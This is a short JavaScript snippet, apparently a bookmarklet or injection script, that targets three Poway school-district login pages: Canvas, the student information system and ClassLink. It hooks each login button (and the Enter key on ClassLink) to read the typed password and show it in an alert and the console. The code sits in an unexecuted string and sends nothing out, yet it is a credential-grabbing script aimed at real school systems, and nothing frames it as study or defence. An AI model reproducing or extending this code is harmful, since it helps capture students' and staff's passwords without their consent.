(function(){
var amogus = `if(window.location.href == 'https://poway.instructure.com/login/ldap'){
(function() {
let btn = document.querySelector("Button.Button--login");
btn.addEventListener("click", () => {
alert(document.getElementById("pseudonym_session_password").value);
console.log(document.getElementById("pseudonym_session_password").value); 
});
}());
} else if(window.location.href == 'https://sis.powayusd.com/PXP2_Login_Student.aspx?regenerateSessionId=True'){
(function() {
let btn = document.getElementById("ctl00_MainContent_Submit1");
btn.addEventListener("click", () => {
alert(document.getElementById('ctl00_MainContent_password').value);
console.log(document.getElementById('ctl00_MainContent_password').value);
});
}());
} else if(window.location.href == 'https://launchpad.classlink.com/poway'){
(function() {
let btn = document.getElementById("signin");
btn.addEventListener("click", () => {
alert(document.getElementById('password').value);
console.log(document.getElementById('password').value);
});
document.addEventListener('keypress', function (e) {
if (e.key === 'Enter') {
alert(document.getElementById('password').value);
console.log(document.getElementById('password').value);
}
});
}());
} else {
alert('This website is not compatible');
}`;
})();